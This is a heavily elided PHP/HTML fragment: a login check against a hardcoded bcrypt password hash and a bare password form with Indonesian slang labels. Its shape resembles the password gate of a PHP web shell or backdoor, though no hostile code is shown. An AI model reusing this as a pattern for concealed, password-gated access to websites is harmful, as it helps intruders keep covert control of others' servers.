...
if (is_logged_in()) {
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2y$10$9dCyPYDaSEYyfEB1pqtXUecktnITl9vm3iWIbb8h1CAi9MU4EoCFK'; // https://bcrypt.online/
    ...
    <body>
        <div class="login-container">
            <form method="POST" action="">
                <label for="password">gua siapa??</label>
                <input type="password" id="password" name="password" autofocus>
                <input type="submit" value="ytta">
            </form>
        </div>
        <script>
